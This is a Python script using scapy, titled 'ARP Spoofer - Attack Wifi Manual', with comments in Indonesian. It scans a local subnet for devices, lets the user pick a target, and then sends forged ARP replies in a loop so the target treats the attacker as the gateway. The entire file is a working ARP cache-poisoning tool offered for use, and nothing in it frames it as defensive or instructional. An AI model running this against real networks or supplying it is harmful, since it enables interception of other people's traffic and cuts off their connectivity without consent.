from scapy.all import ARP, Ether, srp, send
import time

def scan_network(network_range):
    """
    Performs an ARP scan on the network and returns a list of active devices.
    """
    print(f"[+] Scanning Network {network_range}...\n")
    
    arp_request = ARP(pdst=network_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request
    
    result = srp(packet, timeout=5, verbose=False)[0]
    
    devices = []
    for sent, received in result:
        devices.append({"ip": received.psrc, "mac": received.hwsrc})

    return devices

def display_devices(devices):
    """
    Displays a list of devices discovered in the network.
    """
    print("\nList of Detected Devices:")
    print("="*50)
    print("No.\tIP Address\t\tMAC Address")
    print("="*50)
    for index, device in enumerate(devices):
        print(f"{index+1}.\t{device['ip']}\t{device['mac']}")
    print("="*50, "\n")

def get_mac(ip):
    """
    Get MAC address of target IP.
    """
    arp_request = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request
    
    result = srp(packet, timeout=5, verbose=False)[0]
    
    if result:
        return result[0][1].hwsrc
    return None

def arp_spoof(target_ip, spoof_ip):
    """
    Sending ARP Spoofing packets to trick the target.
    """
    target_mac = get_mac(target_ip)
    
    if not target_mac:
        print("[!] Failed to get target MAC address.")
        return
    
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    
    print(f"[+] Start ARP Spoofing To {target_ip} ({target_mac})...")
    try:
        while True:
            send(packet, verbose=False)
            print(f"[+] Start ARP Spoof To {target_ip}, pretend to be {spoof_ip}")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] The attack was stopped.")

# --- Main Program ---
print("="*50)
print("     ARP Spoofer - Attack Wifi Manual")
print("="*50)

# **1. Memasukkan IP Gateway**
gateway_ip = input("Input IP Gateway: ").strip()

# **2. Memilih metode scanning**
print("\n[1] Scan Automatic Networking")
print("[2] Input IP Target Manual")
mode = input("Select Method (1/2): ").strip()

if mode == "1":
    # **User Memasukkan Range IP Jaringan untuk Scan**
    network_range = input("Input IP (Example: 192.168.1.0/24): ").strip()
    if not "/" in network_range:
        network_range += "/24"  # Tambahkan subnet default jika tidak ada
    
    # **Scanning Jaringan**
    devices = scan_network(network_range)
    
    if not devices:
        print("[!] No device found.")
    else:
        display_devices(devices)

        # **Memilih target dari daftar hasil scan**
        try:
            target_index = int(input("Select Target Number: ")) - 1
            if target_index < 0 or target_index >= len(devices):
                print("[!] Number Not Valid.")
            else:
                target_ip = devices[target_index]["ip"]
                print(f"[+] Target: {target_ip}")
                print(f"[+] Gateway: {gateway_ip}")

                # **Menjalankan ARP Spoofing**
                arp_spoof(target_ip, gateway_ip)

        except ValueError:
            print("[!] Input Valid Number.")

elif mode == "2":
    # **User Memasukkan IP Target Secara Manual**
    target_ip = input("Input IP Target: ").strip()
    
    # **Menjalankan ARP Spoofing**
    arp_spoof(target_ip, gateway_ip)

else:
    print("[!] Select Not Valid.")
